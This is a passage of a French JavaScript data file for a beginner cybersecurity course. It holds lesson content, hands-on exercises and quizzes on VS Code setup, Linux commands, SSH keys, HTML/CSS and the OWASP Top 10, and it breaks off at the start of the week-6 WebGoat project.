/* ==========================================================================
   HACKINÉTIQUE — script.js (données des 24 semaines + moteur de l'application)
   ========================================================================== */

// PHASE 1 — FONDAMENTAUX & SÉCURITÉ WEB (S1 à S6)
const PHASE1 = [
{
  id: "S1", week: 1, phase: 1,
  title: "Installation & environnement VS Code",
  level: "debutant",
  duration: "Semaine 1 · ~6h",
  intro: "Avant d'attaquer ou de défendre quoi que ce soit, tout professionnel de la cybersécurité a besoin d'un poste de travail fiable. Cette semaine pose la fondation technique de tout le parcours HACKINÉTIQUE : Visual Studio Code, votre « établi » unique pour les 24 prochaines semaines.",
  objectives: [
    "Installer et configurer Visual Studio Code sur son poste.",
    "Mettre en place un sous-système Linux (WSL2) ou un terminal natif.",
    "Identifier les composants clés de l'interface : explorateur, terminal intégré, palette de commandes.",
    "Installer les extensions indispensables au parcours.",
    "Produire et exécuter un premier fichier HTML."
  ],
  definition: "Installation de VS Code + WSL2 (Windows) ou terminal natif (macOS/Linux). Prise en main de l'interface : explorateur de fichiers, terminal intégré, palette de commandes (Ctrl+Shift+P).",
  analogy: { title: "🔨 VS Code comme établi d'artisan", text: "Un menuisier débutant n'a pas besoin de dix ateliers différents : il a besoin d'un seul établi bien organisé. VS Code joue ce rôle : le terminal, l'éditeur de code, le client SSH et les extensions de sécurité y sont tous rangés au même endroit." },
  keyTerms: [
    { term: "IDE", def: "Environnement de développement intégré : logiciel qui regroupe éditeur, terminal et outils de débogage." },
    { term: "WSL2", def: "Windows Subsystem for Linux v2 : un vrai noyau Linux exécuté nativement sous Windows." },
    { term: "Palette de commandes", def: "Menu universel de VS Code (Ctrl+Shift+P) donnant accès à toutes les actions disponibles." },
    { term: "Extension", def: "Module additionnel qui enrichit VS Code (langages, linters, connecteurs distants)." }
  ],
  lesson: [
    { heading: "Pourquoi un environnement unique ?", html: "<p>Multiplier les logiciels (un éditeur pour le code, un autre terminal, un client SSH séparé) augmente la charge mentale et le risque d'erreur. Le programme HACKINÉTIQUE choisit <strong>VS Code</strong> comme unique porte d'entrée : il sera utilisé pour écrire du HTML en semaine 4, scanner un réseau en semaine 14 ou rédiger un rapport d'audit en semaine 22.</p>" },
    { heading: "Installation de VS Code", html: "<p>Téléchargez l'installeur officiel sur <code>code.visualstudio.com</code>, exécutez-le, puis lancez l'application. Vérifiez la version installée via le menu <em>Aide → À propos</em>.</p>" },
    { heading: "Mettre en place le terminal Linux", html: "<p>Sous Windows, ouvrez PowerShell <strong>en administrateur</strong> et exécutez :</p><pre><code>wsl --install</code></pre><p>Redémarrez le poste. Sous macOS/Linux, le terminal natif (zsh/bash) est directement utilisable — aucune installation supplémentaire n'est nécessaire à ce stade.</p>" },
    { heading: "Explorer l'interface", html: "<p>Trois zones à maîtriser dès aujourd'hui :</p><ul><li><strong>Explorateur de fichiers</strong> (icône en haut à gauche) : navigue dans les dossiers du projet.</li><li><strong>Terminal intégré</strong> (raccourci <code>Ctrl+\`</code>) : exécute des commandes sans quitter VS Code.</li><li><strong>Palette de commandes</strong> (<code>Ctrl+Shift+P</code>) : recherche n'importe quelle action par mot-clé.</li></ul>" },
    { heading: "Extensions à installer dès aujourd'hui", html: "<ul><li><strong>WSL</strong> — connecte VS Code au sous-système Linux.</li><li><strong>Remote - SSH</strong> — prépare les connexions distantes de la semaine 3.</li><li><strong>Live Server</strong> — prévisualise une page HTML en un clic.</li><li><strong>Prettier</strong> — formate automatiquement le code.</li></ul>" }
  ],
  standards: ["NIST SP 800-123 — Guide to General Server Security (hygiène de poste de travail)", "CompTIA Security+ — Domaine 4.1 : outils et techniques de base"],
  steps: [
    { text: "Télécharger et installer VS Code.", color: "blue" },
    { text: "Installer WSL2 sur Windows ou configurer le terminal natif sur macOS.", color: "orange" },
    { text: "Prise en main de l'interface.", color: "blue" },
    { text: "Ouvrir le terminal intégré.", color: "orange" },
    { text: "Installer les extensions : WSL, Remote-SSH, Live Server, Prettier.", color: "blue" },
    { text: "Créer un fichier index.html pour tester.", color: "orange" },
    { text: "Livrable : environnement VS Code fonctionnel.", color: "red" }
  ],
  deliverable: "Un environnement VS Code opérationnel : WSL2 (ou terminal natif) installé, quatre extensions actives, un fichier index.html créé et prévisualisé avec Live Server.",
  tp: {
    title: "TP S1 — Construire son poste de travail sécurisé",
    objectif: "Mettre en place un environnement de développement complet et vérifiable, base de tous les TP suivants.",
    duree: "45–60 minutes",
    materiel: ["Un ordinateur avec 8 Go de RAM minimum", "Connexion internet stable", "Droits administrateur sur le poste"],
    consignes: [
      "Installer Visual Studio Code depuis le site officiel.",
      "Activer WSL2 (Windows) via `wsl --install`, ou vérifier le terminal natif (macOS/Linux).",
      "Ouvrir VS Code et afficher successivement l'explorateur, le terminal intégré et la palette de commandes.",
      "Installer les extensions WSL, Remote-SSH, Live Server et Prettier depuis le panneau Extensions.",
      "Créer un dossier `hackinetique-s1`, y ajouter un fichier `index.html` contenant un titre et un paragraphe.",
      "Lancer Live Server et vérifier l'affichage dans le navigateur.",
      "Faire une capture d'écran de l'environnement complet (explorateur + terminal + page affichée)."
    ],
    livrable: "Capture d'écran de l'environnement VS Code fonctionnel + fichier index.html.",
    criteres: ["WSL2 ou terminal natif opérationnel", "4 extensions installées et visibles", "Page HTML affichée sans erreur via Live Server"]
  },
  quiz: [
    { q: "Quel est le rôle principal de WSL2 dans ce programme ?", options: ["Accélérer le processeur", "Exécuter un véritable noyau Linux sous Windows", "Remplacer VS Code", "Chiffrer le disque dur"], correct: 1, explanation: "WSL2 fournit un noyau Linux réel, permettant d'utiliser les mêmes commandes et outils que sur une distribution Linux native." },
    { q: "Quel raccourci ouvre la palette de commandes dans VS Code ?", options: ["Ctrl+P", "Ctrl+Shift+P", "Ctrl+`", "Alt+F4"], correct: 1, explanation: "Ctrl+Shift+P ouvre la palette de commandes, point d'entrée universel vers toutes les actions de VS Code." },
    { q: "Quelle extension permet de prévisualiser une page HTML en un clic ?", options: ["Prettier", "GitLens", "Live Server", "Remote-SSH"], correct: 2, explanation: "Live Server lance un serveur web local et actualise automatiquement le navigateur à chaque modification." },
    { q: "Pourquoi préférer un environnement de travail unique plutôt que plusieurs logiciels séparés ?", options: ["C'est obligatoire légalement", "Cela réduit la charge mentale et le risque d'erreur", "Cela coûte moins cher", "Cela améliore le Wi-Fi"], correct: 1, explanation: "Centraliser les outils dans VS Code limite les changements de contexte et les erreurs de manipulation, un principe d'ergonomie retenu par les référentiels professionnels (CompTIA Security+)." },
    { q: "Quelle commande PowerShell installe WSL depuis un terminal administrateur ?", options: ["sudo install wsl", "wsl --install", "apt install wsl", "wsl new"], correct: 1, explanation: "`wsl --install` est la commande officielle Microsoft pour installer WSL2 et une distribution Linux par défaut." }
  ]
},
{
  id: "S2", week: 2, phase: 1,
  title: "Terminal Linux — bases",
  level: "debutant",
  duration: "Semaine 2 · ~6h",
  intro: "Le terminal est l'outil de travail principal de tout professionnel de la cybersécurité : 90 % des opérations d'audit, de scan ou de défense s'y déroulent. Cette semaine construit les réflexes de navigation et de manipulation de fichiers en ligne de commande.",
  objectives: [
    "Naviguer dans l'arborescence de fichiers Linux en ligne de commande.",
    "Créer, copier, déplacer et supprimer fichiers et dossiers.",
    "Comprendre et modifier les permissions Unix (chmod, chown).",
    "Rechercher du texte et des fichiers avec grep et find.",
    "Écrire un premier script Bash exécutable."
  ],
  definition: "Navigation (cd, ls, pwd), gestion de fichiers (cp, mv, rm). Permissions (chmod, chown). Recherche (grep, find).",
  analogy: { title: "🗂️ Le terminal comme classeur", text: "Naviguer en ligne de commande, c'est comme se déplacer dans un immeuble de bureaux : `pwd` indique l'étage où vous êtes, `ls` liste les portes du couloir, `cd` vous fait entrer dans une pièce." },
  keyTerms: [
    { term: "Chemin absolu", def: "Chemin complet depuis la racine du système, ex : /home/user/projet." },
    { term: "Chemin relatif", def: "Chemin exprimé depuis le dossier courant, ex : ./projet." },
    { term: "Permission Unix", def: "Droits de lecture (r), écriture (w) et exécution (x) attribués à l'utilisateur, au groupe et aux autres." },
    { term: "Shebang", def: "Ligne #!/bin/bash en tête d'un script indiquant l'interpréteur à utiliser." }
  ],
  lesson: [
    { heading: "Se repérer dans l'arborescence", html: "<p><code>pwd</code> affiche le dossier courant, <code>ls</code> liste son contenu, <code>cd</code> permet de s'y déplacer. Ces trois commandes couvrent 80 % des besoins de navigation quotidiens.</p>" },
    { heading: "Manipuler fichiers et dossiers", html: "<ul><li><code>mkdir</code> crée un dossier, <code>touch</code> crée un fichier vide.</li><li><code>cp source destination</code> copie, <code>mv</code> déplace ou renomme.</li><li><code>rm</code> supprime (irréversible : pas de corbeille en ligne de commande).</li></ul>" },
    { heading: "Comprendre les permissions", html: "<p>Chaque fichier possède des droits <strong>rwx</strong> pour le propriétaire, le groupe et les autres utilisateurs. La commande <code>chmod 755 script.sh</code> rend un script exécutable par son propriétaire et lisible par tous ; <code>chown</code> change le propriétaire d'un fichier.</p>" },
    { heading: "Rechercher efficacement", html: "<p><code>grep \"motif\" fichier</code> cherche du texte dans un fichier ; <code>find /chemin -name \"*.log\"</code> cherche des fichiers par nom. Ces deux commandes sont au cœur de toute investigation (forensics, analyse de logs).</p>" },
    { heading: "Premier script Bash", html: "<pre><code>#!/bin/bash\necho \"Bonjour, $(whoami) !\"\ndate</code></pre><p>Rendez-le exécutable avec <code>chmod +x script.sh</code> puis lancez-le via <code>./script.sh</code>.</p>" }
  ],
  standards: ["CompTIA Linux+ / Security+ — Domaine « Administration système »", "NIST SP 800-53 — AC-6 Least Privilege (base des permissions Unix)"],
  steps: [
    { text: "Structure du système de fichiers.", color: "blue" },
    { text: "Commandes de navigation.", color: "orange" },
    { text: "Gestion des fichiers.", color: "blue" },
    { text: "Permissions avec chmod et chown.", color: "orange" },
    { text: "Recherche avec grep et find.", color: "blue" },
    { text: "Créer un mini-script bash.", color: "orange" },
    { text: "Livrable : mini-script bash fonctionnel.", color: "red" }
  ],
  deliverable: "Un script Bash exécutable qui affiche un message, la date, et liste le contenu d'un dossier.",
  tp: {
    title: "TP S2 — Explorateur et organisateur en ligne de commande",
    objectif: "Manipuler un système de fichiers exclusivement en ligne de commande et produire un script Bash fonctionnel.",
    duree: "60 minutes",
    materiel: ["Terminal WSL2/Linux configuré en semaine 1"],
    consignes: [
      "Créer une arborescence `projet/{docs,scripts,logs}` avec `mkdir -p`.",
      "Créer trois fichiers vides dans `docs/` avec `touch`.",
      "Copier un fichier de `docs/` vers `logs/`, puis le renommer avec `mv`.",
      "Modifier les permissions d'un fichier pour le rendre lecture seule (`chmod 444`).",
      "Rechercher tous les fichiers `.txt` du dossier `projet/` avec `find`.",
      "Écrire un script `scripts/rapport.sh` qui affiche l'utilisateur courant, la date, et le contenu du dossier `projet/`.",
      "Rendre le script exécutable et l'exécuter."
    ],
    livrable: "Arborescence `projet/` complète + script `rapport.sh` exécuté avec succès (capture du terminal).",
    criteres: ["Arborescence correcte et cohérente", "Permissions modifiées avec succès", "Script exécutable sans erreur"]
  },
  quiz: [
    { q: "Quelle commande affiche le dossier courant ?", options: ["ls", "cd", "pwd", "find"], correct: 2, explanation: "`pwd` (print working directory) affiche le chemin absolu du dossier courant." },
    { q: "Que signifie la permission `755` appliquée à un script ?", options: ["Lecture seule pour tous", "rwx pour le propriétaire, r-x pour le groupe et les autres", "Aucun accès", "Écriture seule pour le propriétaire"], correct: 1, explanation: "7 = rwx (propriétaire), 5 = r-x (groupe), 5 = r-x (autres) : le propriétaire peut tout faire, les autres peuvent lire et exécuter." },
    { q: "Quelle commande recherche le texte « error » dans un fichier de log ?", options: ["find error log.txt", "grep \"error\" log.txt", "cd error log.txt", "chmod error log.txt"], correct: 1, explanation: "`grep` recherche un motif texte à l'intérieur du contenu d'un ou plusieurs fichiers." },
    { q: "Quelle ligne doit démarrer un script Bash pour préciser l'interpréteur ?", options: ["#!/bin/bash", "//bash", "<script>", "@bash"], correct: 0, explanation: "Le shebang `#!/bin/bash` indique au système quel interpréteur utiliser pour exécuter le script." },
    { q: "Pourquoi le principe du moindre privilège s'applique-t-il aux permissions Unix ?", options: ["Pour accélérer le système", "Pour limiter les accès au strict nécessaire et réduire la surface d'attaque", "Pour économiser de l'espace disque", "Ce n'est pas lié à la sécurité"], correct: 1, explanation: "Le moindre privilège (NIST SP 800-53, AC-6) limite les droits de chaque utilisateur/fichier au strict nécessaire, réduisant l'impact d'une compromission." }
  ]
},
{
  id: "S3", week: 3, phase: 1,
  title: "Terminal Linux — approfondissement",
  level: "debutant",
  duration: "Semaine 3 · ~6h",
  intro: "Après les bases, place à la gestion des processus, aux variables d'environnement et à la première connexion distante sécurisée via SSH — la porte d'entrée de toute administration système à distance.",
  objectives: [
    "Visualiser et arrêter des processus système.",
    "Configurer des variables d'environnement persistantes.",
    "Comprendre le principe du chiffrement asymétrique appliqué à SSH.",
    "Établir une connexion SSH vers une machine distante."
  ],
  definition: "Gestion des processus (ps, top, kill). Variables d'environnement. Introduction à SSH.",
  analogy: { title: "📞 SSH comme ligne téléphonique chiffrée", text: "SSH, c'est comme appeler quelqu'un sur une ligne dont seuls vous deux possédez la clé de déchiffrement : même si quelqu'un intercepte la conversation, il n'entend qu'un bruit incompréhensible." },
  keyTerms: [
    { term: "Processus", def: "Instance d'un programme en cours d'exécution, identifiée par un PID (identifiant unique)." },
    { term: "SSH", def: "Secure Shell : protocole chiffré permettant d'administrer une machine à distance." },
    { term: "Variable d'environnement", def: "Valeur globale accessible par les programmes du shell, ex : $PATH." },
    { term: "Clé publique/privée", def: "Paire cryptographique : la clé publique se partage, la clé privée reste secrète." }
  ],
  lesson: [
    { heading: "Observer et gérer les processus", html: "<p><code>ps aux</code> liste tous les processus actifs, <code>top</code> (ou <code>htop</code>) les affiche en temps réel avec leur consommation CPU/RAM. <code>kill -9 &lt;PID&gt;</code> force l'arrêt d'un processus bloqué.</p>" },
    { heading: "Variables d'environnement", html: "<p>Une variable comme <code>$PATH</code> indique au shell où chercher les exécutables. On peut définir ses propres variables avec <code>export MA_VAR=\"valeur\"</code>, et les rendre permanentes en les ajoutant au fichier <code>~/.bashrc</code> ou <code>~/.zshrc</code>.</p>" },
    { heading: "Introduction à SSH", html: "<p>SSH chiffre l'intégralité d'une session distante. La connexion s'effectue avec :</p><pre><code>ssh utilisateur@adresse_ip</code></pre><p>L'authentification par clé (plutôt que par mot de passe) est recommandée : la clé privée reste sur votre machine, la clé publique est déposée sur le serveur distant.</p>" }
  ],
  standards: ["NIST SP 800-53 — SC-12/SC-13 Cryptographic Key Management", "PCI DSS — exigence d'accès distant chiffré"],
  steps: [
    { text: "Visualiser les processus avec ps et top.", color: "blue" },
    { text: "Arrêter un processus avec kill.", color: "orange" },
    { text: "Variables d'environnement.", color: "blue" },
    { text: "Configurer .bashrc ou .zshrc.", color: "orange" },
    { text: "Introduction à SSH.", color: "blue" },
    { text: "Se connecter à une machine distante.", color: "orange" },
    { text: "Livrable : connexion SSH réussie.", color: "red" }
  ],
  deliverable: "Capture d'écran d'une connexion SSH réussie vers une machine distante (ou VM locale), accompagnée d'une variable d'environnement personnalisée persistante.",
  tp: {
    title: "TP S3 — Superviser un système et se connecter à distance",
    objectif: "Observer l'activité système et réaliser une première connexion SSH sécurisée.",
    duree: "60 minutes",
    materiel: ["Terminal Linux/WSL2", "Une seconde machine ou VM accessible en réseau (ou serveur SSH local activé)"],
    consignes: [
      "Lister les processus actifs avec `ps aux` et identifier les 3 plus consommateurs de CPU avec `top`.",
      "Lancer un processus factice (`sleep 300 &`) puis l'arrêter avec `kill`.",
      "Créer une variable d'environnement `HACKINETIQUE_USER` et l'ajouter à `.bashrc`.",
      "Générer une paire de clés SSH avec `ssh-keygen -t ed25519`.",
      "Copier la clé publique sur la machine cible avec `ssh-copy-id`.",
      "Se connecter en SSH par clé (sans mot de passe) et vérifier la connexion avec `whoami` sur la machine distante."
    ],
    livrable: "Capture du terminal montrant la connexion SSH réussie par clé + preuve de la variable d'environnement persistante (`echo $HACKINETIQUE_USER` dans un nouveau terminal).",
    criteres: ["Connexion SSH établie sans mot de passe", "Variable d'environnement persistante après redémarrage du terminal", "Processus correctement identifié et arrêté"]
  },
  quiz: [
    { q: "Quelle commande affiche les processus en temps réel avec leur consommation CPU ?", options: ["ps", "top", "cd", "grep"], correct: 1, explanation: "`top` (ou `htop`) rafraîchit en continu la liste des processus et leur consommation de ressources." },
    { q: "Quel signal envoie `kill -9` à un processus ?", options: ["Une pause", "Un arrêt forcé immédiat (SIGKILL)", "Un redémarrage", "Une mise en veille"], correct: 1, explanation: "Le signal 9 (SIGKILL) termine immédiatement un processus sans lui laisser l'occasion de se fermer proprement." },
    { q: "Pourquoi l'authentification SSH par clé est-elle préférable au mot de passe ?", options: ["Elle est plus rapide à taper", "Elle élimine le risque de mot de passe faible ou volé par force brute", "Elle ne nécessite pas internet", "Elle fonctionne sans terminal"], correct: 1, explanation: "Une clé privée de 256 bits est pratiquement impossible à casser par force brute, contrairement à de nombreux mots de passe." },
    { q: "Où faut-il ajouter une variable d'environnement pour qu'elle soit persistante ?", options: ["Dans /etc/passwd", "Dans ~/.bashrc ou ~/.zshrc", "Dans /tmp", "Elle est toujours persistante par défaut"], correct: 1, explanation: "Les fichiers de configuration du shell (.bashrc, .zshrc) sont chargés à chaque nouvelle session et permettent de rendre les variables permanentes." },
    { q: "Quel fichier doit rester strictement secret dans une paire de clés SSH ?", options: ["La clé publique (id_ed25519.pub)", "La clé privée (id_ed25519)", "Le fichier known_hosts", "Le fichier config"], correct: 1, explanation: "La clé privée ne doit jamais être partagée ; seule la clé publique est déposée sur les serveurs distants." }
  ]
},
{
  id: "S4", week: 4, phase: 1,
  title: "Structurer une page web (HTML)",
  level: "debutant",
  duration: "Semaine 4 · ~6h",
  intro: "Comprendre le Web commence par son squelette : le HTML. Cette semaine construit les bases indispensables pour, plus tard, repérer les failles côté client (XSS, injection HTML) que l'on découvrira en phase 3.",
  objectives: [
    "Structurer un document HTML valide avec des balises sémantiques.",
    "Créer un formulaire HTML fonctionnel.",
    "Intégrer liens et images correctement.",
    "Appliquer les bases de l'accessibilité web.",
    "Publier un site statique sur GitHub Pages."
  ],
  definition: "Balises sémantiques, formulaires, liens et images. Publication sur GitHub Pages.",
  keyTerms: [
    { term: "Balise sémantique", def: "Élément HTML qui décrit le sens de son contenu (header, nav, main, footer) plutôt qu'un simple style." },
    { term: "DOM", def: "Document Object Model : représentation arborescente d'une page HTML manipulable par le navigateur/JavaScript." },
    { term: "Attribut alt", def: "Texte alternatif d'une image, essentiel pour l'accessibilité et le référencement." },
    { term: "GitHub Pages", def: "Service gratuit d'hébergement de sites statiques directement depuis un dépôt GitHub." }
  ],
  lesson: [
    { heading: "Anatomie d'un document HTML", html: "<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"fr\"&gt;\n&lt;head&gt;\n  &lt;meta charset=\"UTF-8\"&gt;\n  &lt;title&gt;Ma page&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;h1&gt;Bonjour&lt;/h1&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>" },
    { heading: "Balises sémantiques", html: "<p>Plutôt que d'empiler des <code>&lt;div&gt;</code> génériques, utilisez <code>&lt;header&gt;</code>, <code>&lt;nav&gt;</code>, <code>&lt;main&gt;</code>, <code>&lt;article&gt;</code>, <code>&lt;footer&gt;</code>. Cela améliore l'accessibilité (lecteurs d'écran) et le référencement naturel.</p>" },
    { heading: "Formulaires", html: "<p>Un formulaire collecte des données utilisateur — et constitue la première surface d'attaque web que l'on étudiera dès la semaine 5 (validation côté serveur, injection).</p><pre><code>&lt;form action=\"/envoyer\" method=\"POST\"&gt;\n  &lt;label for=\"email\"&gt;Email&lt;/label&gt;\n  &lt;input type=\"email\" id=\"email\" name=\"email\" required&gt;\n  &lt;button type=\"submit\"&gt;Envoyer&lt;/button&gt;\n&lt;/form&gt;</code></pre>" },
    { heading: "Liens, images et accessibilité", html: "<p><code>&lt;a href=\"...\"&gt;</code> crée un lien, <code>&lt;img src=\"...\" alt=\"...\"&gt;</code> une image. L'attribut <code>alt</code> n'est pas optionnel : il rend le contenu accessible et doit toujours être renseigné.</p>" },
    { heading: "Publier sur GitHub Pages", html: "<p>Créez un dépôt GitHub, poussez vos fichiers HTML, puis activez GitHub Pages dans les paramètres du dépôt (branche <code>main</code>, dossier racine). Le site est alors accessible publiquement en HTTPS.</p>" }
  ],
  standards: ["W3C HTML Living Standard", "WCAG 2.1 — Web Content Accessibility Guidelines (niveau AA)"],
  steps: [
    { text: "Structure HTML.", color: "blue" },
    { text: "Balises sémantiques.", color: "orange" },
    { text: "Formulaires.", color: "blue" },
    { text: "Liens et images.", color: "orange" },
    { text: "Accessibilité.", color: "blue" },
    { text: "Publier sur GitHub Pages.", color: "orange" },
    { text: "Livrable : page web publiée.", color: "red" }
  ],
  deliverable: "Une page web personnelle, structurée sémantiquement, contenant un formulaire de contact et publiée en ligne via GitHub Pages.",
  tp: {
    title: "TP S4 — Publier sa première page web",
    objectif: "Construire et publier une page HTML sémantique et accessible.",
    duree: "90 minutes",
    materiel: ["VS Code + extension Live Server", "Compte GitHub"],
    consignes: [
      "Créer un fichier `index.html` avec header, nav, main et footer.",
      "Ajouter une section « À propos » et une section « Contact » avec un formulaire (nom, email, message).",
      "Ajouter une image avec un attribut `alt` descriptif.",
      "Vérifier le rendu avec Live Server.",
      "Créer un dépôt GitHub `mon-profil-hackinetique`, y pousser le code avec `git init / add / commit / push`.",
      "Activer GitHub Pages dans les paramètres du dépôt et vérifier l'URL publique."
    ],
    livrable: "URL publique de la page GitHub Pages + code source du dépôt.",
    criteres: ["Structure sémantique correcte (header/nav/main/footer)", "Formulaire fonctionnel avec attribut `required`", "Site accessible publiquement en HTTPS"]
  },
  quiz: [
    { q: "Quelle balise structure sémantiquement l'en-tête d'une page ?", options: ["<div>", "<header>", "<top>", "<title>"], correct: 1, explanation: "<header> est une balise sémantique HTML5 dédiée à l'en-tête de page ou de section." },
    { q: "À quoi sert l'attribut `alt` d'une image ?", options: ["Changer sa couleur", "Fournir un texte alternatif pour l'accessibilité et le référencement", "Définir sa taille", "La rendre cliquable"], correct: 1, explanation: "L'attribut alt est lu par les lecteurs d'écran et affiché si l'image ne charge pas — un critère WCAG 2.1 essentiel." },
    { q: "Quelle méthode HTTP est recommandée pour un formulaire envoyant des données sensibles ?", options: ["GET", "POST", "HEAD", "PING"], correct: 1, explanation: "POST transmet les données dans le corps de la requête plutôt que dans l'URL, évitant leur exposition dans l'historique ou les logs serveur." },
    { q: "Que permet GitHub Pages ?", options: ["Héberger gratuitement un site statique depuis un dépôt Git", "Compiler du code Python", "Scanner des vulnérabilités", "Envoyer des emails"], correct: 0, explanation: "GitHub Pages sert directement les fichiers statiques d'un dépôt (HTML/CSS/JS) sur une URL publique en HTTPS." },
    { q: "Pourquoi les balises sémantiques (nav, main, article) sont-elles préférées aux <div> génériques ?", options: ["Elles chargent plus vite", "Elles améliorent l'accessibilité et la compréhension du contenu par les machines", "Elles sont obligatoires en HTML5", "Elles remplacent le CSS"], correct: 1, explanation: "Les balises sémantiques donnent du sens au contenu pour les lecteurs d'écran, les moteurs de recherche et les outils d'analyse automatisés." }
  ]
},
{
  id: "S5", week: 5, phase: 1,
  title: "Mise en forme (CSS) & introduction aux attaques web",
  level: "debutant",
  duration: "Semaine 5 · ~6h",
  intro: "Le CSS habille la structure HTML. Cette semaine marque aussi le premier contact avec la face sombre du Web : le modèle client/serveur vu sous l'angle offensif, et la découverte du référentiel international incontournable — l'OWASP Top 10.",
  objectives: [
    "Utiliser les sélecteurs CSS pour cibler des éléments précisément.",
    "Construire une mise en page avec Flexbox.",
    "Décrire le modèle client/serveur et le cycle d'une requête HTTP.",
    "Identifier les 10 catégories de vulnérabilités web selon l'OWASP Top 10.",
    "Analyser les en-têtes de sécurité HTTP d'un site réel."
  ],
  definition: "Sélecteurs CSS, Flexbox. Client/serveur, requêtes HTTP. Découverte de l'OWASP Top 10.",
  keyTerms: [
    { term: "OWASP", def: "Open Worldwide Application Security Project : organisation à but non lucratif de référence en sécurité des applications web." },
    { term: "OWASP Top 10", def: "Classement des 10 catégories de risques les plus critiques pour les applications web, mis à jour périodiquement." },
    { term: "En-tête HTTP", def: "Métadonnée envoyée avec une requête ou réponse HTTP (ex : Content-Security-Policy, Strict-Transport-Security)." },
    { term: "Flexbox", def: "Modèle de mise en page CSS unidimensionnel facilitant l'alignement et la distribution d'éléments." }
  ],
  lesson: [
    { heading: "Sélecteurs CSS", html: "<p>Un sélecteur cible un ou plusieurs éléments : <code>.classe</code>, <code>#id</code>, <code>element</code>, ou des combinaisons comme <code>nav a:hover</code>. La spécificité détermine quelle règle l'emporte en cas de conflit.</p>" },
    { heading: "Flexbox en pratique", html: "<pre><code>.conteneur {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n}</code></pre><p>Flexbox résout en quelques lignes des problèmes d'alignement historiquement complexes en CSS.</p>" },
    { heading: "Le modèle client/serveur", html: "<p>Un navigateur (client) envoie une <strong>requête HTTP</strong> à un serveur, qui répond avec un code de statut (200, 404, 500...) et un contenu. HTTPS ajoute une couche de chiffrement TLS à cet échange.</p>" },
    { heading: "Découvrir l'OWASP Top 10", html: "<p>Référence mondiale en sécurité applicative, l'OWASP Top 10 liste les risques majeurs : Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Identification Failures, Software/Data Integrity Failures, Logging Failures, et Server-Side Request Forgery.</p>" },
    { heading: "Analyser les en-têtes HTTP", html: "<p>Avec les outils de développement du navigateur (onglet Réseau), on observe des en-têtes comme <code>Content-Security-Policy</code> ou <code>X-Frame-Options</code>, qui renforcent (ou non) la sécurité d'un site.</p>" }
  ],
  standards: ["OWASP Top 10 (2021)", "OWASP Secure Headers Project"],
  steps: [
    { text: "Sélecteurs CSS.", color: "blue" },
    { text: "Flexbox.", color: "orange" },
    { text: "Modèle client/serveur.", color: "blue" },
    { text: "OWASP Top 10.", color: "orange" },
    { text: "Analyser les en-têtes HTTP.", color: "blue" },
    { text: "Fiche de synthèse sur 3 vulnérabilités.", color: "orange" },
    { text: "Livrable : fiche de synthèse.", color: "red" }
  ],
  deliverable: "Une fiche de synthèse présentant 3 catégories de l'OWASP Top 10, avec exemple concret et mesure de mitigation pour chacune.",
  tp: {
    title: "TP S5 — Mettre en page et auditer des en-têtes HTTP",
    objectif: "Styliser une page avec Flexbox et réaliser une première analyse de sécurité passive sur un site réel.",
    duree: "75 minutes",
    materiel: ["Page HTML de la semaine 4", "Navigateur avec outils de développement"],
    consignes: [
      "Styliser la page du TP S4 avec Flexbox pour la barre de navigation et la mise en page principale.",
      "Ouvrir les outils de développement (onglet Réseau) sur un site autorisé (ex : owasp.org) et inspecter les en-têtes de réponse HTTP.",
      "Identifier la présence ou l'absence de `Content-Security-Policy` et `Strict-Transport-Security`.",
      "Choisir 3 catégories de l'OWASP Top 10 et rédiger pour chacune : définition, exemple concret, mesure de mitigation.",
      "Compiler le tout dans une fiche de synthèse Markdown."
    ],
    livrable: "Fiche de synthèse Markdown (3 vulnérabilités OWASP documentées) + page HTML stylisée en Flexbox.",
    criteres: ["Mise en page Flexbox fonctionnelle et responsive", "3 vulnérabilités correctement définies avec mitigation", "Analyse d'en-têtes HTTP correcte et documentée"]
  },
  quiz: [
    { q: "Que signifie le sigle OWASP ?", options: ["Open Web Application Security Project", "Online Web Application Standard Protocol", "Organized Web Attack Surface Program", "Open Worldwide Application Security Project"], correct: 3, explanation: "OWASP a officiellement changé de nom en 2021 : Open Worldwide Application Security Project." },
    { q: "Quelle propriété CSS active le mode Flexbox sur un conteneur ?", options: ["display: flex;", "position: flex;", "flex: true;", "layout: flex;"], correct: 0, explanation: "`display: flex;` transforme un élément en conteneur flexible pour ses enfants directs." },
    { q: "Quel en-tête HTTP protège contre certaines attaques par injection de script ?", options: ["Content-Type", "Content-Security-Policy", "User-Agent", "Accept-Language"], correct: 1, explanation: "Content-Security-Policy (CSP) restreint les sources de scripts, styles et ressources autorisées, limitant l'impact d'une injection XSS." },
    { q: "Dans le modèle client/serveur, quel rôle joue le navigateur ?", options: ["Serveur", "Client", "Base de données", "Pare-feu"], correct: 1, explanation: "Le navigateur est le client : il envoie des requêtes HTTP et affiche les réponses du serveur." },
    { q: "L'OWASP Top 10 est-il un référentiel statique et définitif ?", options: ["Oui, il ne change jamais", "Non, il est régulièrement mis à jour selon l'évolution des menaces", "Il concerne uniquement les réseaux", "Il concerne uniquement les mots de passe"], correct: 1, explanation: "L'OWASP Top 10 évolue (dernières éditions 2017, 2021) pour refléter les tendances réelles des vulnérabilités observées en production." }
  ]
},
{
  id: "S6", week: 6, phase: 1,
  title: "Projet de phase 1",
  level: "debutant",
  duration: "Semaine 6 · ~8h (projet)",
  intro: "Semaine de synthèse : appliquer en laboratoire légal (OWASP WebGoat) les notions de fragilité web découvertes en semaine 5, puis documenter la démarche comme un professionnel — car un test d'intrusion sans rapport n'a aucune valeur.",
  objectives: [
    "Déployer un environnement de laboratoire vulnérable de façon autorisée.",
    "Réaliser une injection HTML simple et en comprendre le mécanisme.",
    "Analyser du code source pour identifier une faille.",
    "Rédiger un mini-rapport d'audit structuré."
  ],
  definition: "Attaque guidée en laboratoire (OWASP WebGoat). Revue de code vulnérable. Présentation orale.",
  keyTerms: [
    { term: "WebGoat", def: "Application web volontairement vulnérable de l'OWASP, conçue pour l'apprentissage légal des failles web." },
    { term: "Injection HTML", def: "Insertion de code HTML non filtré dans une page, pouvant altérer son affichage ou son comportement." },
    { term: "Rapport d'audit", def: "Document structuré décrivant les vulnérabilités trouvées, leur criticité et les recommandations de correction." }
  ],
